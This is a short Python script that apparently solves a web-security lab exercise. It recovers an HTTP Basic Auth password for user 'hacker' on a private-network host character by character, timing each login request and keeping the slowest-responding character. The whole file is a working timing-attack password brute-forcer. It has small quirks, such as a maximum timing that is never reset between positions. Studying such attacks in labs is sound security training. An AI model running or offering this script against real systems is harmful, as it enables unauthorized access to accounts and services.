import requests
import time
from time import sleep

lasttime=0
password=''
max=0
temp='a'
r = requests.get('http://172.20.10.7/authentication/example2/', auth=('hacker', 'test'))

while r.status_code == 401:
# for letra in range(ord('a'), ord('z')+1):
	for letra in range(48,127):
 		start = time.time()
 		r = requests.get('http://172.20.10.7/authentication/example2/', auth=('hacker', str(password+chr(letra))))
 		reqtime = time.time() - start
 		print(password+chr(letra), "=", reqtime, r.status_code)
 		if max<reqtime:
 			max=reqtime
 			temp=chr(letra)
 		if r.status_code == 200:
 			print("hecho")
 			exit()
	password=password+temp

print("Password ====> ",password)